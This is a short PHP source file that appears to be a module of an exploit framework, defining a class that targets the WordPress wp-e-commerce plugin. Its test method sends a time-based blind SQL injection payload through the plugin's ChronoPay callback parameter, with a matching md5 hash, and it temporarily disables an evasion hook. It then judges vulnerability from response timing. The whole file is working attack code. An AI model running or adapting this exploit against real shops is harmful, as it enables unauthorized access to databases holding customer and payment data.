<?php
class EcommerceExploit extends BaseExploit
{
	public $name="wp-e-commerce";

	public function test()
	{
		$this->timein();
		$t=BaseExploit::$evasionFunction;
		BaseExploit::$evasionFunction=null;
		$payload="-1 AND 1=IF(2>1,{$this->benchmark()},0)#";
		BaseExploit::$evasionFunction=$t;
		$hash=md5(md5($payload));
		$res=$this->curl(self::$url."?chronopay_callback=true"

			,"cs2=chronopay&cs1={$payload}&cs3={$hash}&transaction_type=rebill");
		return !$this->fastEnough($this->timeout());
	}
}